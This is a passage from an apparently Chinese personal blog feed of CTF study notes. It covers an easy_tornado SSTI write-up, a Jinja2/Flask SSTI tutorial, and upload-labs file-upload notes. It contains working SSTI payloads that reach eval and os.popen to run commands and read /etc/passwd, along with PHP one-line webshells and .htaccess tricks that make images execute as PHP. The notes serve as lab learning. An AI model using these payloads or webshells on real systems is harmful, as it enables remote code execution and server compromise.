2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>tornado是Python下的1个web模板框架<br>进入页面，发现以下可访问项:<br>&#x2F;flag.txt<br>&#x2F;welcome.txt<br>&#x2F;hints.txt<br>分别访问，结果如下:<br>页面: &#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;5623eec5b6308052633aef08ea7d497a<br>结果:<br>&#x2F;flag.txt<br>flag in &#x2F;fllllllllllllag</p><p>页面: &#x2F;file?filename&#x3D;&#x2F;welcome.txt&amp;filehash&#x3D;086cb0e1be24629a233966b3131a3443<br>结果:<br>&#x2F;welcome.txt<br>render</p><p>页面: &#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;0af2fd6996c0cf35b0f7d6f3bd8b29b0<br>结果:<br>&#x2F;hints.txt<br>md5(cookie_secret+md5(filename))</p><p>这个hint….有啥用? cookie_secret: balabala，说白了就是对文件进行哈希验证<br>思路: 根据观察hints.txt以及url的参数得知，需要找到cookie_secret，然后和md5(filename)拼接才能通过验证，查看flag</p><p>存在msg参数(这个msg参数是怎么来的呢? 是发现在尝试注入报错后会返回这么个东西: <a href="http://42f63a3c-968f-48fa-a487-ae00bcb04161.node4.buuoj.cn:81/error?msg=Error">http://42f63a3c-968f-48fa-a487-ae00bcb04161.node4.buuoj.cn:81/error?msg=Error</a>)<br>那么cookie_secret怎么来的呢? 这就考验你查阅官方文档(全tm英文)的能力了</p><p>构造payload: error?msg&#x3D;    (这handler是啥我也8么学，看wp的)<br>就阔以获得cookie_secret了: {‘autoreload’: True, ‘compiled_template_cache’: False, ‘cookie_secret’: ‘3f239178-c592-4337-9b6a-4bf7d50d3a25’} </p><p>md5(filename): 3bf9f6cf685a6dd8defadabfb41a03a1<br>md5(cookie_secret+md5(filename)): b5c5087056961d3c3b65dd600d92d43b<br>成功得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI模板注入学习</title>
    <link href="/2022/04/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/04/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>首先，新人初见这个有点蒙圈，8知道怎么学，需要学什么，总之看wp和看文章发现啥也8会，于是在学完后我总结了一下<br>问了下大佬，大概学个原理再加python的flask就可以上手了，其他的框架都是遇到了现学(知道原理即可，本质还是字符串注入)</p><p>然后关于payload的构造，也是非常简单，打开python交互中断跟着敲一遍就会了<br>由于SSTI涉及的模板太多了，因此该学一手tplmap??<br><img src="/images/ssti.jpg"></p><p>比如以下这个有漏洞代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>SSTI_TEST<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, %s !<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>正确代码应该是: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125; !<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h1><p>render_template渲染函数的问题<br><a href="https://blog.csdn.net/weixin_51353029/article/details/111503731">链接</a><br>即：{undefined{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{undefined{}}包裹的内容当做变量解析替换。比如{undefined{1+1}}会被解析成2<br>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过</p><h1 id="Flask里的SSTI漏洞"><a href="#Flask里的SSTI漏洞" class="headerlink" title="Flask里的SSTI漏洞"></a>Flask里的SSTI漏洞</h1><p>在 CTF 中，最常见的也就是 Jinja2 的 SSTI 漏洞了，过滤不严，构造恶意数据提交达到读取 flag 或 getshell 的目的。下面以 Python 为例：<br>Flask SSTI 题的基本思路就是利用 python 中的 魔术方法 找到自己要用的函数。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__dict__</span>：保存类实例或对象实例的属性变量键值对字典<br><span class="hljs-emphasis">__class__</span>：返回调用的参数类型<br><span class="hljs-emphasis">__mro__</span>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class="hljs-emphasis">__bases__</span>：返回类型列表<br><span class="hljs-emphasis">__subclasses__</span>：返回object的子类<br><span class="hljs-emphasis">__init__</span>：类的初始化方法<br><span class="hljs-emphasis">__globals__</span>：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价<br></code></pre></td></tr></table></figure><p>通常操作:<br>测试有么有注入: </p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/login?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml">  /*或者&#123;undenfined&#123;7*7&#125;&#125;，如果返回了49就说明有漏洞*/</span><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[].<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>(int x)<br></code></pre></td></tr></table></figure><p>基类+子类列出所有类, 这些类中含有file\open等函数</p><h1 id="关于python的前置知识"><a href="#关于python的前置知识" class="headerlink" title="关于python的前置知识"></a>关于python的前置知识</h1><p>我们阔以利用的类一般有哪些?<br>file:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(&#x27;/etc/passwd&#x27;)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure><p>以一个简单的flask代码为例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,rendr_template<br>app=Flask(dick)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-comment">#这里呢..是在设置页面内容，是使用flask模板的固定语句，参数为&#x27;/&#x27;，意思就是再访问&#x27;/&#x27;页面时会执行随后定义的index函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>  <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;H3llo.html&quot;</span>)   <span class="hljs-comment">#Hllo.html就是会显示的东西</span><br>app.run  <span class="hljs-comment"># 运行我们设置的模板</span><br></code></pre></td></tr></table></figure><p>再来一段完整的flask框架代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template_string,request<br>app=Flask(__name__) <br>indexhtml=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;title&gt;just a test&lt;/title&gt;</span><br><span class="hljs-string">&lt;body&gt;&lt;h1&gt;</span><br><span class="hljs-string">why not come &lt;a href=&quot;ssti&quot;&gt;here &lt;/a&gt;to have a look&lt;/h1&gt;</span><br><span class="hljs-string">&lt;/h1&gt;&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>whoareuhtml=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;title&gt;here s ssti&lt;/title&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&lt;h3&gt;you should tell me who you are then i can say hello to u!(use ?name= in url)&lt;/h3&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tinyhtml=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;title&gt;here s ssti&lt;/title&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&lt;h1&gt;hello %s&lt;/h1&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/index&quot;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> indexhtml<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/ssti&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ssti</span>():<br>    name=request.args.get(<span class="hljs-string">&quot;name&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(whoareuhtml)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template_string(tinyhtml%name)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h1 id="一道payload解析"><a href="#一道payload解析" class="headerlink" title="一道payload解析"></a>一道payload解析</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;   <span class="hljs-comment">#利用数组的父类+子类</span><br>&#123;% <span class="hljs-keyword">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;                <span class="hljs-comment">#catch_warnings是什么鬼? 原因是需要的函数往往在catching_warnings下</span><br>  &#123;% <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;      <br>  &#123;% <span class="hljs-keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;                   <span class="hljs-comment">#这是何意? </span><br>    &#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() %&#125;<br>      &#123;&#123; b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;<br>    &#123;% endif %&#125;<br>  &#123;% endif %&#125;<br>  &#123;% endfor %&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;      <span class="hljs-comment">#至于&#123;%%&#125;这些东西，是用来在html里执行python代码</span><br></code></pre></td></tr></table></figure><h1 id="payload是怎么构造来的-以flask为例"><a href="#payload是怎么构造来的-以flask为例" class="headerlink" title="payload是怎么构造来的(以flask为例)"></a>payload是怎么构造来的(以flask为例)</h1><p>首先，在cmdd输入python，打开交互式界面<br>然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__ <br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__.__base__   <span class="hljs-comment">#返回&#x27;shit&#x27;的类的父类</span><br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__.__base__.__subclasses__()   <span class="hljs-comment">#__subclasses()函数返回类的所有子类</span><br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytearray_iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes_iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;callable_iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;classmethod_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;coroutine&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_itemiterator&#x27;</span>&gt;<span class="hljs-comment">#.......以下省略，总之很多]</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>].__init__<br>&lt;slot wrapper <span class="hljs-string">&#x27;__init__&#x27;</span> of <span class="hljs-string">&#x27;weakref&#x27;</span> objects&gt;  <span class="hljs-comment">#&quot;&#x27;weakref&#x27;对象的插槽包装器&#x27;__init__&#x27;&quot;(直译，意思就是返回了个函数)</span><br><span class="hljs-comment"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br><span class="hljs-comment">#这里为什么要调用__init__呢，因为python一切皆对象，然后我也解释不清了.....</span><br><span class="hljs-comment">#再换几个子类，很快就能找到一个重载过__init__的类，比如balabala......</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;shit&#x27;</span>.__class__.__base__.subclasses__()[<span class="hljs-number">103</span>].__init__.__globals__[<span class="hljs-string">&#x27;builtins&#x27;</span>]<br><span class="hljs-comment"># 以下省略一堆，总之，__globals__[&#x27;builtins&#x27;]选中了builtins模块，这个模块里有很多牛逼的函数(比如eval)</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;type flag.txt&#x27;).read()&quot;</span>)<br><br><span class="hljs-comment">#&lt;!----------------------&gt;</span><br><span class="hljs-comment"># payload2</span><br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>).read()&#125;&#125;<br><span class="hljs-comment"># payload3</span><br>&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;    <br>&#123;% <span class="hljs-keyword">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;  <br>&#123;% <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;  <br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() %&#125;   <br>&#123;&#123; b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;type flag.txt&quot;).read()&#x27;</span>) &#125;&#125;  <br>&#123;% endif %&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br><span class="hljs-comment"># os模块都是从catching_warnings模块入手</span><br><span class="hljs-comment">#逻辑相关的用&#123;%%&#125;，变量相关的用&#123;&#123;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="more"><a href="#more" class="headerlink" title="more"></a>more</h1><p>Jinjan2 基础语法</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-template-variable">&#123;% … %&#125;</span><br><span class="hljs-template-variable">&#123;&#123; … &#125;&#125;</span><br>&#123;<span class="hljs-comment"># … #&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>锻</title>
    <link href="/2022/04/05/%E9%94%BB/"/>
    <url>/2022/04/05/%E9%94%BB/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="089cb4784ce3ca3bc2b2057077efb02c0b9c48b0cc75253dc1970ef6e0769f54"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">三乾</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>http走私攻击</title>
    <link href="/2022/04/04/http%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/"/>
    <url>/2022/04/04/http%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>最近学习http走私攻击，原理相对简单，于是8再赘述，主要记录思路梳理&amp;&amp;攻击手法，方便抄个作业</p><p>原理: 觉得这篇文章讲得很8错，直接上链接—-<a href="https://paper.seebug.org/1048/">链接</a></p><p>老规矩，先挖个坑，然后不出意料的话就会一直留着不填….</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload_labs刷题&amp;&amp;文件上传漏洞笔记</title>
    <link href="/2022/03/28/upload-labs%E5%88%B7%E9%A2%98/"/>
    <url>/2022/03/28/upload-labs%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>因为这玩意网上wp一找一堆，所以只是自学的笔记&amp;&amp;payload作业，合并成1篇就够了</p><p>然后在做题的过程中发现基本能找到的<br>做的过程中好多关卡明明在看了源码后确定就是这个漏洞，却总是上传失败或者上传结果和预期8一样，推测是apache版本的缘故，搞得我很8爽，最后干脆学个姿势就8管了</p><h1 id="win11下phpstudy搭建环境，访问localhost时没有响应"><a href="#win11下phpstudy搭建环境，访问localhost时没有响应" class="headerlink" title="win11下phpstudy搭建环境，访问localhost时没有响应"></a>win11下phpstudy搭建环境，访问localhost时没有响应</h1><p>搭了个upload-labs靶场进行学习，搭建时遇到了玄学问题，在这里记录一下<br>用phpstyudy搭靶场时遇到了在联想和edge浏览器阔以访问localhost，但在火狐上却无法访问，想了好久没解决，最后rx<del>花了5min就</del>解决了，这里记录一下</p><p>上网查询火狐返回的报错: winspace[request not found]，然后提示应该是winspace这个 <del>8知有求用</del> 的win11新增软件占用了80端口，把它关了就行了</p><p>然而在查询占用了80端口的进程的pid后，却发现该pid并8是winspace，于是就迷了，解决8了。使用了”求援会长”机会*1，然后rx看了几分钟，在任务管理器里找到了winspace进程(1个win11新增的8知有啥鸟用的进程)，关闭，问题解决…..草(主要是一开始我也想是这玩意作妖，结果在占用80端口的pid里没有发现它，就把他排除了…)</p><h1 id="一些payoload作业"><a href="#一些payoload作业" class="headerlink" title="一些payoload作业"></a>一些payoload作业</h1><h2 id="htaccess常见"><a href="#htaccess常见" class="headerlink" title=".htaccess常见"></a>.htaccess常见</h2><p>我就匪夷所思啊，.htaccess在靶场上用就从来没有成功过….(编码问题? 还是? )</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">&lt;FilesMatch <span class="hljs-string">&quot;abc&quot;</span> &gt;<br>SetHandler application/x-httpd-php<br>&lt;<span class="hljs-string">/FilesMatch</span>&gt;<br><span class="hljs-string">//</span>意思是将当前目录下文件名为abc的文件都当php解析<br><br>SetHandler application/x-httpd-php<br><span class="hljs-string">//</span>让Apache将其他类型文件均以php格式解析<br><br>AddType application/x-httpd-php <span class="hljs-string">.jpg</span><br><span class="hljs-string">//</span>把<span class="hljs-string">.jpg</span>解析成<span class="hljs-string">.php</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_post</span>[<span class="hljs-string">&#x27;x&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a? &lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>])&lt;/script&gt;  <span class="hljs-comment">//文件幻术头绕过...</span><br><span class="hljs-comment">/*--------------*/</span><br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v&#x27;</span>]);&lt;/script&gt;  <span class="hljs-comment">//绕过&lt;?，许多命令可以换成这个写法 </span><br></code></pre></td></tr></table></figure><h1 id="pass-01-前端js验证"><a href="#pass-01-前端js验证" class="headerlink" title="pass-01 前端js验证"></a>pass-01 前端js验证</h1><p>首先查看提示: 是前端js检测，于是F12+F1召唤控制台，点击关闭js就行了<br>当然，也可以按其他wp的提示，修改js代码(可以将html代码全复制下来，再修改，打开，然后添加一点action之类)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span 